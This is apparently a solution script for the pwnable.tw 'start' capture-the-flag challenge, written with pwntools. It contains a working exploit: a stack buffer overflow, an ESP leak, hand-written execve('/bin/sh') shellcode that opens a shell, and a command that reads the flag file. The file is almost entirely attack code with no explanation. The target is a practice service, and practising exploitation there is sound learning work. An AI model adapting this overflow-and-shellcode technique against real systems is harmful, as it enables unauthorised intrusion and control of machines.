#!/usr/bin/env python3
import pwn


def first_attempt(remote):
    shellcode = pwn.asm(pwn.shellcraft.sh())
    length_before_exit_address = 0x14
    padding = length_before_exit_address - len(shellcode)
    assert padding >= 0, padding
    retn_address = 0x0804809C
    payload = shellcode + b'A' * padding + pwn.p32(retn_address)
    remote.send(payload)
    remote.interactive()


def second_attempt(remote):
    pass  # Dropped


def third_attempt(remote):
    length_before_return_address = 0x14
    write_address = 0x08048087
    payload = b'A' * length_before_return_address + pwn.p32(write_address)
    remote.send(payload)

    esp_bytes = 4
    bytes_to_receive = 0x14
    esp = pwn.u32(remote.recv(esp_bytes))
    pwn.info('ESP was %d' % esp)
    remote.recv(bytes_to_receive - esp_bytes)  # Not used

    # shellcode = pwn.asm(pwn.shellcraft.sh())  # too long, manually reduced below
    shellcode = pwn.asm(
    '''
        push 0x68
        push 0x732f2f2f
        push 0x6e69622f
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        /* call execve() */
        push 11 /* 0xb */
        pop eax
        int 0x80
    ''')

    payload = b'A' * length_before_return_address + \
        pwn.p32(esp + length_before_return_address) + \
        shellcode

    assert len(payload) <= 60, len(payload)
    remote.send(payload)
    remote.sendline('cat /home/start/flag')
    pwn.success('Flag is: %s' % remote.recvuntil('\n').rstrip().decode('utf8'))
    remote.interactive()


def main():
    pwn.context(arch='i386', os='linux', endian='little', word_size=32)
    remote = pwn.remote('chall.pwnable.tw', 10000)
    remote.recvuntil("Let's start the CTF:")
    # first_attempt(remote)
    third_attempt(remote)


if __name__ == "__main__":
    main()
